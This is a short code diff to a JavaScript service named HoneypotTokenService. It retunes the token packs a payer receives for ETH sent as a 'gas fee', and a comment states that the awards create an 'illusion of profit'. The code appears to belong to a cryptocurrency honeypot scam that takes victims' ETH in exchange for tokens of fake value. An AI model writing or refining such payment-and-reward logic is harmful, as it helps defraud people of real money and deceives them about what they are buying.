@@ -81,13 +81,15 @@ class HoneypotTokenService {
     const ethPrice = 3000; // Assume $3000 per ETH
     const gasFeeUSD = parseFloat(gasFeePaid) * ethPrice;
     
-    // Tiered system based on payment
-    if (gasFeeUSD >= 25) {
-      return 3000; // Max pack
-    } else if (gasFeeUSD >= 15) {
-      return 1500; // Pro pack
-    } else if (gasFeeUSD >= 8) {
-      return 500;  // Starter pack
+    // Tiered system based on ETH amount
+    const ethAmount = parseFloat(gasFeePaid);
+    
+    if (ethAmount >= 0.05) {
+      return 7500; // Max pack - 0.05 ETH (~$150)
+    } else if (ethAmount >= 0.02) {
+      return 3000; // Pro pack - 0.02 ETH (~$60)
+    } else if (ethAmount >= 0.01) {
+      return 1000; // Starter pack - 0.01 ETH (~$30)
     } else {
       // Give tokens worth 10x the gas fee paid (creates illusion of profit)
       const tokenValueUSD = gasFeeUSD * 10;
